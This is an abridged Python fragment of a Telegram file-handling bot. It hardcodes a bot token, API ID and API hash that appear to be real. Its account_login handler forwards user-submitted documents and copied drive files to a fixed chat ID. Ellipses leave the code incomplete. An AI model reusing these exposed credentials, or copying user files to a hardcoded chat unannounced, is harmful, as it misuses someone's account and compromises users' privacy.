...
bot = Client("bot",
             bot_token= "6506622022:AAFho-67dYd-3Be1X1YVdhqsplmqNpDScaI",
             api_id=5321008 ,
             api_hash= "8a633e8f5259a852ec85d4e8cfc31e67")
...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1002029805707, x)
            ...
            try:                               
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1002029805707)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
